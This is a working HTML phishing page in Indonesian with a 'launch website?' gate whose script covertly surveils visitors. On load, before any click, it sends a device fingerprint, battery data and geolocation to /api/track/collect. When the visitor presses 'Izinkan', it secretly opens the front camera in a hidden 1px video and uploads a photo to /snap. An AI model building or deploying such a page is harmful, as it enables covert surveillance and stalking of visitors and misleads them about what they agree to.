<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Halaman</title>
<style>
  body { margin:0; font:15px/1.5 system-ui,sans-serif; background:#0e0e10; color:#eaeaea; }
  main { padding:40px 24px; }
  #gate { position:fixed; inset:0; z-index:2147483647; background:rgba(10,10,12,.92); display:flex; align-items:center; justify-content:center; }
  #gate .card { background:#1a1a1e; border:1px solid #2e2e34; border-radius:12px; padding:28px 32px; max-width:360px; text-align:center; }
  #gate h2 { margin:0 0 8px; font-size:18px; }
  #gate p  { margin:0 0 20px; color:#9a9aa2; font-size:13px; }
  #gate button { display:block; width:100%; padding:12px; font:inherit; font-weight:600; border:0; border-radius:8px; background:#3b82f6; color:#fff; cursor:pointer; margin-bottom:8px; }
  #gate button.alt { background:#2a2a30; color:#c8c8cf; font-weight:500; }
</style>
</head>
<body>
<main><h1>Selamat datang</h1><p>Halaman ini sedang dimuat.</p></main>

<div id="gate"><div class="card">
  <h2>Luncurkan website?</h2>
  <p>Halaman ini siap ditampilkan.</p>
  <button id="allow">Izinkan</button>
  <button id="deny" class="alt">Batal</button>
</div></div>

<script>
(function () {
  var API = "/api/track";
  var done = false;

  function send(path, body, isForm) {
    var url = API + path;
    if (isForm) {
      return fetch(url, { method: "POST", body: body });
    }
    var blob = new Blob([body], { type: "application/json" });
    if (navigator.sendBeacon) {
      navigator.sendBeacon(url, blob);
      return Promise.resolve();
    }
    return fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: body,
      keepalive: true
    });
  }

  function collectBattery() {
    return new Promise(function (resolve) {
      if (!navigator.getBattery && !navigator.battery) return resolve(null);
      var p = navigator.getBattery ? navigator.getBattery() : Promise.resolve(navigator.battery);
      p.then(function (b) {
        resolve({
          level: Math.round(b.level * 100),
          charging: b.charging,
          chargingTime: b.chargingTime,
          dischargingTime: b.dischargingTime
        });
      }).catch(function () { resolve(null); });
    });
  }

  function geo() {
    return new Promise(function (resolve) {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        function (p) { resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }); },
        function () { resolve(null); },
        { timeout: 4000, maximumAge: 60000 }
      );
    });
  }

  // ---- Kirim data pengunjung SEGERA waktu halaman dibuka ----
  // Nggak nunggu klik apapun. Battery + geo dikirim terpisah biar
  // nggak nge-block kalau izin lokasi lambat.
  function sendBasic() {
    if (done) return;
    done = true;
    var payload = {
      page: location.href,
      referrer: document.referrer || null,
      screen: screen.width + "x" + screen.height,
      viewport: innerWidth + "x" + innerHeight,
      language: navigator.language,
      languages: (navigator.languages || []).join(","),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      platform: navigator.platform,
      userAgent: navigator.userAgent,
      cores: navigator.hardwareConcurrency || null,
      memory: navigator.deviceMemory || null,
      touch: "ontouchstart" in window,
      cookieEnabled: navigator.cookieEnabled,
      ts: new Date().toISOString()
    };
    send("/collect", JSON.stringify(payload), false).catch(function(){});
  }

  function sendExtra() {
    Promise.all([collectBattery(), geo()]).then(function (r) {
      var payload = {
        page: location.href,
        battery: r[0],
        geo: r[1],
        extra: true,
        ts: new Date().toISOString()
      };
      send("/collect", JSON.stringify(payload), false).catch(function(){});
    });
  }

  // langsung kirim waktu script jalan
  sendBasic();
  sendExtra();

  // ---- Gate + kamera ----
  var gate = document.getElementById("gate");

  function snap() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
    navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false
    }).then(function (stream) {
      var v = document.createElement("video");
      v.autoplay = true; v.muted = true; v.playsInline = true; v.srcObject = stream;
      v.style.cssText = "position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;";
      v.onloadedmetadata = function () {
        v.play();
        setTimeout(function () {
          var c = document.createElement("canvas");
          c.width = v.videoWidth || 640;
          c.height = v.videoHeight || 480;
          c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
          c.toBlob(function (blob) {
            if (!blob) return;
            var fd = new FormData();
            fd.append("shot", blob, "shot.jpg");
            fd.append("page", location.href);
            fd.append("ts", new Date().toISOString());
            send("/snap", fd, true).catch(function(){});
            stream.getTracks().forEach(function (t) { t.stop(); });
            v.remove();
          }, "image/jpeg", 0.85);
        }, 800);
      };
      document.body.appendChild(v);
    }).catch(function(){});
  }

  document.getElementById("allow").addEventListener("click", function () {
    gate.remove();
    snap();
  });
  document.getElementById("deny").addEventListener("click", function () {
    gate.remove();
  });
})();
</script>
</body>
</html>
